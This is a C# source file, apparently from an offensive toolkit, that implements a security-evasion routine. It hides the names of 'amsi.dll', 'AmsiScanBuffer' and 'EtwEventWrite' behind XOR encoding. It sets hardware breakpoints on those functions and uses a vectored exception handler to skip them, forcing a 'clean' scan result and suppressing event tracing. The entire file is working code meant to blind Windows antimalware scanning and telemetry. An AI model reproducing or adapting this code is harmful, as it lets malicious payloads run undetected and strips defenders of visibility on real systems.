using System;
using System.Runtime.InteropServices;
using System.Text;
using System.Runtime.CompilerServices;

namespace VanguardCore
{
    public static unsafe class ReflectiveEvasion
    {
        // [PRO] Pointers to target entry points
        private static void* _amsiAddr = null;
        private static void* _etwAddr = null;
        private static IntPtr _vehHandle = IntPtr.Zero;

        // [PRO] Obfuscated string bytes (XOR'd during build or with static salt)
        // salt = 0x55
        private static readonly byte[] _amsiDllEnc = { 0x34, 0x38, 0x26, 0x3C, 0x7B, 0x31, 0x39, 0x39 }; // amsi.dll
        private static readonly byte[] _amsiFuncEnc = { 0x14, 0x38, 0x26, 0x3C, 0x16, 0x36, 0x34, 0x3B, 0x17, 0x20, 0x33, 0x33, 0x30, 0x27 }; // AmsiScanBuffer
        private static readonly byte[] _ntdllEnc = { 0x3B, 0x21, 0x31, 0x39, 0x39, 0x7B, 0x31, 0x39, 0x39 }; // ntdll.dll
        private static readonly byte[] _etwFuncEnc = { 0x10, 0x21, 0x22, 0x10, 0x23, 0x30, 0x3B, 0x21, 0x12, 0x27, 0x3C, 0x21, 0x30 }; // EtwEventWrite

        private static string X(byte[] b) {
            byte[] d = new byte[b.Length];
            for (int i = 0; i < b.Length; i++) d[i] = (byte)(b[i] ^ 0x55);
            return Encoding.UTF8.GetString(d);
        }

        public static void Initialize()
        {
            try
            {
                // 1. Resolve target addresses via stealthy module handle discovery
                IntPtr hAmsi = GetModuleHandleW(X(_amsiDllEnc));
                if (hAmsi == IntPtr.Zero) hAmsi = LoadLibraryW(X(_amsiDllEnc));
                if (hAmsi != IntPtr.Zero)
                    _amsiAddr = (void*)GetProcAddress(hAmsi, X(_amsiFuncEnc));

                IntPtr hNtdll = GetModuleHandleW(X(_ntdllEnc));
                if (hNtdll != IntPtr.Zero)
                    _etwAddr = (void*)GetProcAddress(hNtdll, X(_etwFuncEnc));

                if (_amsiAddr == null && _etwAddr == null) return;

                // 2. [ULTRA PRO] Register Vectored Exception Handler (NativeAOT Compatibility)
                // Use [UnmanagedCallersOnly] to avoid delegate marshaling overhead
                _vehHandle = AddVectoredExceptionHandler(1, (delegate* unmanaged<EXCEPTION_POINTERS*, long>)&ExceptionHandler);
                
                // 3. Set Hardware Breakpoints for initial thread
                ApplyHWBP();
            }
            catch { }
        }

        [UnmanagedCallersOnly]
        private static long ExceptionHandler(EXCEPTION_POINTERS* exceptions)
        {
            // [PRO] Check for Hardware Breakpoint (STATUS_SINGLE_STEP)
            if (exceptions->ExceptionRecord->ExceptionCode == 0x80000004)
            {
                void* rip = (void*)exceptions->ContextRecord->Rip;
                
                if (rip == _amsiAddr || rip == _etwAddr)
                {
                    // [PRO] Safe Return / Stack Pivot logic
                    // We need to return to the caller address which is currently at [RSP]
                    // 1. Read return address from top of stack
                    ulong returnAddr = *(ulong*)exceptions->ContextRecord->Rsp;
                    
                    // 2. Simulate 'ret' (rip = [rsp]; rsp += 8)
                    exceptions->ContextRecord->Rip = returnAddr;
                    exceptions->ContextRecord->Rsp += 8;
                    
                    // 3. Set return value (RAX) to 0 (S_OK / AMSI_RESULT_CLEAN)
                    exceptions->ContextRecord->Rax = 0;
                    
                    // 4. Force specific AMSI_RESULT_CLEAN (0) for AmsiScanBuffer
                    // AmsiScanBuffer(HAMSICONTEXT, PVOID, ULONG, PCWSTR, HAMSISESSION, AMSI_RESULT*)
                    // The 6th argument (r9 on x64 stack or rcx/rdx/r8/r9 registers?)
                    // Actually, on x64: rcx, rdx, r8, r9, then stack at rsp+0x20, rsp+0x28
                    // The 6th arg is at [rsp+0x28] (relative to original call)
                    // After our stack pivot (rsp += 8), the original [rsp+0x28] is at [rsp+0x20]
                    if (rip == _amsiAddr)
                    {
                        ulong resultPtr = *(ulong*)(exceptions->ContextRecord->Rsp + 0x20);
                        if (resultPtr != 0) *(uint*)resultPtr = 0; // AMSI_RESULT_CLEAN
                    }

                    // Clear Trap Flag (just in case) and continue
                    return -1; // EXCEPTION_CONTINUE_EXECUTION
                }
            }
            return 0; // EXCEPTION_CONTINUE_SEARCH
        }

        public static void ApplyHWBP()
        {
            if (_amsiAddr == null && _etwAddr == null) return;
            
            CONTEXT64 ctx = new CONTEXT64();
            ctx.ContextFlags = 0x100010; // CONTEXT_DEBUG_REGISTERS
            
            IntPtr hThread = GetCurrentThread();
            if (GetThreadContext(hThread, ref ctx))
            {
                // Reset all first
                ctx.Dr0 = ctx.Dr1 = ctx.Dr2 = ctx.Dr3 = 0;
                ctx.Dr7 &= ~(ulong)0xFF;

                // Configure Dr0 for AMSI
                if (_amsiAddr != null) {
                    ctx.Dr0 = (ulong)_amsiAddr;
                    ctx.Dr7 |= (1 << 0); // Local enable L0
                }

                // Configure Dr1 for ETW
                if (_etwAddr != null) {
                    ctx.Dr1 = (ulong)_etwAddr;
                    ctx.Dr7 |= (1 << 2); // Local enable L1
                }
                
                // Clear conditions (Execution only: 00)
                ctx.Dr7 &= ~(ulong)(0xF0000 | 0xF00000); 

                SetThreadContext(hThread, ref ctx);
            }
        }

        #region Native Imports
        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)] private static extern IntPtr LoadLibraryW(string lpFileName);
        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)] private static extern IntPtr GetModuleHandleW(string lpModuleName);
        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true)] private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32.dll")] private static extern IntPtr AddVectoredExceptionHandler(uint First, void* Handler);
        [DllImport("kernel32.dll")] private static extern IntPtr GetCurrentThread();
        [DllImport("kernel32.dll")] private static extern bool GetThreadContext(IntPtr hThread, ref CONTEXT64 lpContext);
        [DllImport("kernel32.dll")] private static extern bool SetThreadContext(IntPtr hThread, ref CONTEXT64 lpContext);

        [StructLayout(LayoutKind.Sequential, Pack = 16)]
        private struct CONTEXT64 {
            public ulong P1Home, P2Home, P3Home, P4Home, P5Home, P6Home;
            public uint ContextFlags, MxCsr;
            public ushort SegCs, SegDs, SegEs, SegFs, SegGs, SegSs;
            public uint EFlags;
            public ulong Dr0, Dr1, Dr2, Dr3, Dr6, Dr7;
            public ulong Rax, Rcx, Rdx, Rbx, Rsp, Rbp, Rsi, Rdi, R8, R9, R10, R11, R12, R13, R14, R15, Rip;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct EXCEPTION_RECORD { public uint ExceptionCode; public uint ExceptionFlags; public EXCEPTION_RECORD* ExceptionRecordPtr; public void* ExceptionAddress; public uint NumberParameters; }

        [StructLayout(LayoutKind.Sequential)]
        private struct EXCEPTION_POINTERS { public EXCEPTION_RECORD* ExceptionRecord; public CONTEXT64* ContextRecord; }
        #endregion
    }
}
